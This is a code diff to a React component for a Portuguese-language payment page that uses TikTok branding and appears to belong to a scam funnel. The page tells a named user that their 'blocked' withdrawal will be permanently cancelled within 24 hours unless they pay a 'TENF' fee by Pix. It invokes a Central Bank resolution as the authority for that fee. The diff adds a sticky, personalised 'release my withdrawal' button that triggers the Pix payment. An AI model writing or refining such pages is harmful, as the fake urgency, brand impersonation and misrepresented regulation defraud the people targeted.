@@ -1,5 +1,6 @@
 import { useState, useEffect } from "react";
 import { Loader2, ChevronRight, Shield, AlertTriangle, Lock, Zap, CheckCircle2 } from "lucide-react";
+import StickyCtaBar from "./StickyCtaBar";
 import tiktokLogo from "@/assets/tiktok-logo.png";
 import testimonial1 from "@/assets/testimonial-1.jpg";
 import testimonial2 from "@/assets/testimonial-2.jpg";
@@ -37,7 +38,7 @@ const FunnelUpsellTENF = ({ balance, onGeneratePix, isGenerating, leadCpf, leadN
           )}
         </div>
       </div>
-      <main className="px-4 py-3 space-y-3 max-w-md mx-auto pb-6">
+      <main className="px-4 py-3 space-y-3 max-w-md mx-auto pb-24">
         <div className="bg-red-50 border border-red-200 rounded-xl p-3">
           <div className="flex items-center gap-2 mb-1.5"><AlertTriangle className="w-4 h-4 text-[#FE2C55]" /><span className="text-[#FE2C55] text-xs font-bold uppercase tracking-wide">⛔ Saque Bloqueado — Ação Imediata</span></div>
           <p className="text-gray-600 text-xs leading-relaxed">{firstName ? <><strong className="text-gray-900">{firstName}</strong>, seu</> : "Seu"} saque de <strong className="text-gray-900">{balance}</strong> será <strong className="text-red-600">CANCELADO PERMANENTEMENTE</strong> em 24h se o TENF não for ativado. A Resolução nº 4.893 do Banco Central <strong className="text-gray-900">obriga a validação fiscal</strong> para liberar qualquer transferência acima de R$ 1.500. <strong className="text-red-600">Sem o TENF, você perde o saldo inteiro.</strong></p>
@@ -82,6 +83,13 @@ const FunnelUpsellTENF = ({ balance, onGeneratePix, isGenerating, leadCpf, leadN
         </button>
         <p className="text-gray-300 text-[9px] text-center pb-2">Taxa regulamentada pelo Banco Central do Brasil • Resolução nº 4.893</p>
       </main>
+      <StickyCtaBar
+        onClick={onGeneratePix}
+        isGenerating={isGenerating}
+        label={firstName ? `${firstName.toUpperCase()}, LIBERAR MEU SAQUE` : "LIBERAR MEU SAQUE AGORA"}
+        bgColor="bg-emerald-500"
+        shadowColor="shadow-emerald-500/30"
+      />
     </div>
   );
 };
